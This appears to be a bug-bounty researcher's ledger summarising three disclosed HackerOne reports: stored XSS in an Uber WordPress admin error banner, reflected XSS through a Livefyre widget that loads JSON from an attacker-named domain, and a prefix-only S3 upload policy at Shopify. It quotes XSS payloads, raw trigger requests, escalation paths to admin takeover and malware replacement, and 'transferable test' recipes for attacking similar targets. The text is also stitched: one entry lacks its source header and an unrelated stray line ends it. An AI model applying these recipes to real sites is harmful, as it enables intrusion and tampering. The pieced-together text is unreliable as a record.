SOURCE: https://hackerone.com/reports/126099  2026-11-08
ROUTE: assigned source 1; read in FULL via the report JSON endpoint `curl -A "<desktop UA>" -H 'Accept: application/json' https://hackerone.com/reports/126099.json` (HTTP 200, 6,152 B, `visibility: full`, `vulnerability_information` 3,140 chars — the reporter's whole write-up, quoted below). Metadata as served: Uber, "Stored XSS in drive.uber.com WordPress admin panel", weakness `Cross-site Scripting (XSS) - Generic`, bounty **$2,000**, reporter `jouko`, submitted 2016-03-26, disclosed 2016-05-14. FRESHNESS: Mar 2016 (~10.6 yrs) — the concrete plugin/stack is gone; the METHOD (an unhandled exception whose message carries the request, persisted into a privileged error banner and rendered unfiltered) is what transfers.
STATUS: UNVERIFIED (not reproduced — no WordPress instance was stood up; the request, the parameter and the escalation are quoted from the public body)
CLASS: STORED XSS in an ADMIN-ONLY ERROR/NOTICE surface reached from an UNHANDLED EXCEPTION whose message reflects attacker input → JavaScript in the WordPress administrator's session → RCE (create-admin via AJAX, or PHP write via the plugin/theme editor) · CWE-79 → CWE-94
CORE METHOD (reporter's steps, verbatim structure):
  1. ENTRY POINT: the All-in-One Event Calendar plugin's widget render path — `GET /oh/?ai1ec_js_widget=ai1ec_agenda_widget&render=true&events_per_page=$%&xss=<svg/onload=alert(/stored-xss/.source)>`.
  2. The request MUST be sent RAW, WITHOUT URL-encoding the special characters, so "this can't be done with a normal web browser" — the reporter's PERL one-liner opens `openssl s_client -connect drive.uber.com:443` and prints the literal request line, so `$%` reaches the app intact.
  3. `events_per_page=$%` is an INVALID FORMAT STRING in the plugin's SQL query ("an invalid format string in an SQL query, caused by the malformed *events_per_page* parameter"); the query throws and the response is a redirect back to the front page — but the plugin DISABLES ITSELF and places an error-message "banner" in the WP administrative Dashboard, "shown to any administrator who logs on afterwards".
  4. "The error details can be manipulated by the attacker and special HTML characters aren't filtered. The error message includes e.g. the URL which triggered the error, which is controllable by the attacker." → the `xss=` value is persisted verbatim inside the banner.
  5. Any administrator who logs on is shown the Dashboard banner → the payload executes with administrator privileges (only admins can view the Dashboard).
  6. ESCALATION (reporter's Impact, verbatim): "the script could use AJAX functions to e.g. create a new administrator user with a known password, or write arbitrary PHP code on the server via the plugin or theme editors."
  7. FIX named: comment out the error-detail generation in `wp-content/plugins/all-in-one-event-calendar/lib/exception/handler.php` (end of file). The reporter tested the shape on a local WordPress + the same plugin (Apache vs nginx may change URL-encoding details).
DETECTION SIGNAL: any plugin/app that, on an UNHANDLED EXCEPTION or a malformed request, PERSISTS the error text — often including the request URL or a parameter value — and re-renders it to a PRIVILEGED viewer (admin dashboard notice, a "the plugin has been disabled" banner, an error-log viewer, an import/validation report). The tells: (a) the error string echoes a request-controlled value and is NOT HTML-escaped; (b) the trigger needs a RAW, un-encoded request (a malformed format string, an out-of-range/illegal type) that a normal browser cannot emit; (c) the sink is a page only an administrator loads.
CHAIN: attacker sends a raw malformed request that throws inside the plugin (primitive: a format-string/SQL error tripped by an un-URL-encoded parameter — no account needed beyond reachability) → the plugin persists an UNFILTERED admin error banner containing the attacker's URL (primitive: stored injection into an admin-only notice surface) → every administrator who opens the WP Dashboard executes the payload (stored XSS in an admin session) → AJAX create-admin with a known password, or PHP write via the plugin/theme editor (escalation: privilege escalation) → server-side compromise (final: RCE).
TRANSFERABLE TEST: find every place the target PERSISTS and re-renders exception/error text to a privileged user. Push a value that violates the strictest internal precondition the code assumes — an invalid format string (`$%`), a non-numeric where a number is expected, an illegal/oversized type — and check whether the ERROR text echoes your input AND whether it HTML-escapes it; then confirm the trigger is reachable RAW (no browser-side encoding). Rule: **an error path that persists the request into a privileged banner is a write primitive into the admin's session — an unhandled exception is an injection point, not merely a bug report.**
DEDUPE / DELTA (over recorded material): `126099`, `ai1ec`, `All In One Event Calendar`, `events_per_page`, `format string` (as THIS report) = 0 hits across the three write targets. This is a DELTA over the already-recorded harvest-ledger §1.1 "Write-time vs. read-time sanitization gap — WordPress plugin admin notice" (HackerOne #3447021, Automattic / Pressable-Atomic, "XSS via unescaped admin notices leads to code execution", disclosed 2025-12): §1.1's entry point is a serialized WP OPTION the attacker must be able to WRITE (`atomic_single_option_limiter_notices`) whose message element is `echo`ed raw while its class passes `esc_attr()`; HERE the entry point is an UNHANDLED EXCEPTION triggered by a RAW malformed request — no option-write privilege is needed, the message is the request URL itself, and the persistence is the plugin's self-disable banner. Same CLASS (admin-notice/banner stored XSS → code execution), DIFFERENT injection mechanism → recorded as a delta, NO new §17 slot.

SOURCE: https://hackerone.com/reports/134061  2026-11-08
ROUTE: assigned source 2; read in FULL via the report JSON endpoint (HTTP 200, 9,578 B, `visibility: full`, `vulnerability_information` 2,158 chars — the reporter's whole write-up incl. the live payload JSON, quoted below). Metadata as served: Uber, "Reflected XSS via Livefyre Media Wall in newsroom.uber.com", weakness `Cross-site Scripting (XSS) - Generic`, bounty **$2,000**, reporter `mdv`, submitted 2016-04-23, disclosed 2016-05-09. FRESHNESS: Apr 2016 (~10.6 yrs) — the Livefyre widget (`streamhub-permalink v0.4.1`, `newsroom.uber.com`) is gone; the METHOD (a widget URL parameter that names the content-provider host, whose fetched JSON has an HTML field rendered unsanitized) transfers to every modern third-party embed of that shape.
STATUS: UNVERIFIED (not reproduced — no host was stood up and the Livefyre endpoint is retired; the parameter format, the fetch URL and the JSON are quoted from the public body)
CLASS: REFLECTED XSS via a THIRD-PARTY EMBED WIDGET whose CONTENT-PROVIDER HOST is taken from a URL parameter — the attacker names their own domain, the widget fetches the attacker's JSON from `bootstrap.<their-domain>`, and an HTML field (`bodyHtml`) is injected into the HOST origin unsanitized · CWE-79
CORE METHOD (reporter's steps, verbatim structure):
  1. The vulnerability "works in all sites where there [is a] Livefyre Media Wall", including `newsroom.uber.com`. The page's `lf-content` GET parameter is consumed by the client library `https://cdn.livefyre.com/libs/streamhub-permalink/v0.4.1/streamhub-permalink.min.js`.
  2. The parameter format is `lf-content=<controlled-domain>:<collection_id>:<content_id>` — the DOMAIN is attacker-chosen. The library then fetches: `https://bootstrap.<controlled-domain>/api/v3.0/content/thread/?collection_id=<collection_id>&content_id=<content_id>&depth_only=false`.
  3. Reproduce: `https://newsroom.uber.com/?lf-content=danylod.com/uber.php?:131560603:307477931`.
  4. Host the JSON yourself at `https://bootstrap.<your-domain>/…` (the reporter used `https://bootstrap.danylod.com/uber.php`) with `status:"ok"`, `data.content[0].content.bodyHtml = "<marquee>XSS</marquee><script>alert(\"XSS on \"+ document.domain)</script>"`, plus matching `collectionId`/`id`/`ancestorId`/`parents`.
  5. The widget injects `bodyHtml` into the page WITHOUT escaping → the script executes on `newsroom.uber.com` (screenshot F89055); the alert prints `document.domain` to prove the origin is the target's, not the attacker's.
DETECTION SIGNAL: any embedded third-party widget/feed/comment/embed whose configuration is driven by a URL parameter that names a DOMAIN or PROVIDER (`domain`, `provider`, `site`, `host`, `feed`, `url`, `endpoint`, `subdomain`); the widget library BUILDS a fetch URL from that value and then renders a field of the fetched JSON/HTML as markup (`bodyHtml`, `html`, `content`, `description`). The tell: change the parameter's domain to a host you control and see whether the widget fetches from YOUR host and renders your field, in the target's origin.
CHAIN: attacker controls a domain and hosts a JSON body (primitive: attacker data source) → the widget parameter `lf-content=<domain>:<collection>:<content>` makes the vendor library fetch `https://bootstrap.<attacker-domain>/…` (primitive: attacker-named content provider) → the returned `bodyHtml` is inserted into the host page's DOM with no escaping (primitive: reflected/stored injection) → the payload runs in `newsroom.uber.com`'s origin for any visitor who opens the crafted URL (final: XSS with session impact on the hosting site; $2,000).
TRANSFERABLE TEST: enumerate every third-party embed/widget on the target and look for a parameter that names its DATA SOURCE (domain/host/provider/site/feed/url). Point it at a host you control, serve the JSON shape the library expects, and put markup (`<script>alert(document.domain)</script>`, `"><img src=x onerror=…>`) in EVERY HTML-ish field; load the target page and check whether your marker executes in the TARGET's origin (it must — an execution in your own origin is not the target's bug). Rule: **a widget that fetches its content from a host YOU name in a parameter is remote content you fully control, so the escaping question moves to a field the target's own front-end renders unsanitized.**
DEDUPE / DELTA (over recorded material): `134061`, `Livefyre`, `lf-content`, `bodyHtml`, `streamhub`, `Media Wall`, `collection_id`, `content_id` = 0 hits across the three write targets. Sibling of the recorded §17.274 (the target's content source is a third-party PUBLICLY-EDITABLE document — a Google Sheet) but a DIFFERENT mechanism: there the attacker EDITS the third party's document; HERE the attacker NAMES the source HOST via a parameter and serves their own JSON. Also distinct from the recorded oEmbed/Embedly material (a WHITELISTED embed host — `codepen.io` — serving attacker JS inside an Electron-style host, bbhskills ~3106-3114), which is about a trusted provider, not a parameter-controlled one. Recorded as a delta/mechanism-variant → NO new §17 slot.

ROUTE: assigned source 4; read in FULL via the report JSON endpoint (HTTP 200, 5,704 B, `visibility: full`, `vulnerability_information` 2,622 chars — the reporter's whole write-up, quoted below). Metadata as served: Shopify, "Arbitrary write on s3://shopify-delivery-app-storage/files", weakness `Improper Authentication - Generic`, bounty **$2,000**, reporter `brakhane`, submitted 2015-10-13, disclosed 2015-10-15. HONEST LIMITATION (reporter's own, verbatim): "While I was unable to create a second store to fully test this (I can't create new development stores right now, support is researching this), I strongly believe that this vulnerability works as I expect it to work due to the nature of the policy." — i.e. the finding rests on POLICY ANALYSIS, not a completed cross-tenant write; it was nonetheless resolved and paid. FRESHNESS: Oct 2015 (~11 yrs) — the concrete bucket is gone; the METHOD (a signed upload policy scoped only by a prefix over a shared bucket) transfers to every S3/GCS/Azure pre-signed-upload design.
STATUS: UNVERIFIED (not reproduced — no object store was stood up; the policy and the steps are quoted from the public body)
CLASS: AUTH-BYPASS / over-broad SIGNED-UPLOAD POLICY → arbitrary write and REPLACE of objects across a SHARED, multi-tenant object-storage bucket (server-side security misconfiguration WITH demonstrated cross-tenant impact) · CWE-863 / CWE-732
CORE METHOD (reporter's steps, verbatim structure):
  1. The Shopify Delivery app hands the client a SIGNED S3 upload POLICY + signature. The policy's ONLY key restriction is a PREFIX:
     `{"expiration":"2015-10-14T15:27:47Z","conditions":[{"bucket":"shopify-delivery-app-storage"},["starts-with","$key","files/"],{"acl":"private"},{"success_action_status":"200"},["content-length-range",0,5368709120]]}`
     — it does NOT pin the exact key.
  2. "The only (security relevant) limitations we have here are: Signature + Policy are only valid for one day · The key has to start with `files/` · ACL has to be set private. So, one can basically write arbitrary files to the S3 bucket as long as those are within the `files/` dir."
  3. THE VECTOR (reporter's list): "Find a shop with a downloadable good and purchase it OR get a manual direct link → Grab the bucket key when the file will be downloaded directly from S3 (via signed url) → Go to your own shop, create a product with a downloadable good → Note down the parameters used to POST the file when you upload it → Issue a new request to the key recorded from the data you don't own with the parameters you just grabbed from your own delivery app → Profit."
  4. Because the bucket is SHARED across tenants and the prefix is the only constraint, the attacker OVERWRITES another merchant's downloadable file: "One could do a ton of fun stuff to the files, to my mind come Viruses, Exploits, Illegal Content, etc."
  5. FIX named: "The policy should be tailored directly to the upload at hand, especially the key. … The policy should be nailed directly to that key to eliminate this vulnerability." The reporter also left two test files (`files/hackerone/simon/brakhane/kitty.jpg`, `files/kitty.jpg`) for cleanup.
DETECTION SIGNAL: any object-storage upload that ships a browser/client-obtainable SIGNED policy or signature (S3 POST policy, GCS signed URL/PUT, Azure SAS) whose conditions use only a PREFIX or wildcard (`["starts-with","$key","<prefix>"]`) instead of the EXACT key the app already returns to the client; a SHARED bucket/prefix serving MULTIPLE tenants' assets; a long `expiration`; and a signed DOWNLOAD URL that reveals the real key path. The tell: replay your OWN signed policy against a DIFFERENT key under the same prefix that belongs to someone else.
CHAIN: any customer of the platform (primitive: one ordinary account, no privilege) → obtain a valid signed upload policy for a prefix you may write (`files/`) (primitive: prefix-scoped policy) → capture another tenant's object key from a signed download URL (primitive: key disclosure) → POST/overwrite that foreign key using YOUR OWN policy+signature (primitive: cross-tenant object write) → replace another merchant's downloadable product with malware / illegal content (escalation: integrity of a distributed artefact) → every buyer who downloads the replaced file (final: supply-chain / malware distribution; $2,000).
TRANSFERABLE TEST: collect the target's signed-upload credentials (its own upload form / API), read the POLICY's key conditions, and re-issue an upload to a key OUTSIDE the one you were given but INSIDE the allowed prefix — an exact-key policy rejects it (`AccessDenied` / `EntityTooLarge`), a `starts-with` policy accepts it; then check whether the bucket is SHARED (foreign keys visible in signed download URLs / listings) to size the impact. Rule: **a signed upload policy scoped only by a prefix authorises a write to every object under that prefix — replay your own signature against a foreign key under the same prefix, and ask whether the bucket serves more than one tenant.**
DEDUPE (over recorded material): `93691`, `shopify-delivery-app-storage`, `starts-with`, `presigned post`, `post policy`, `s3 policy`, `success_action_status`, `content-length-range`, `delivery app` = 0 hits across the three write targets. The recorded `presigned` material is the oCIS signed-URL VALIDATOR (§17.212 — fail-open expiry, an INBOUND validation bug) and the aws-iam-authenticator presigned-STS token — both about authenticating an INBOUND signed request, NOT about the SCOPE of an OUTBOUND signed-upload policy. Not a duplicate of the recorded Shopify **#93921** picker/body-id cross-tenant IDOR (different report, different mechanism: a body field vs a bucket policy). New general method → §17.275.

  4. Return from the getter.
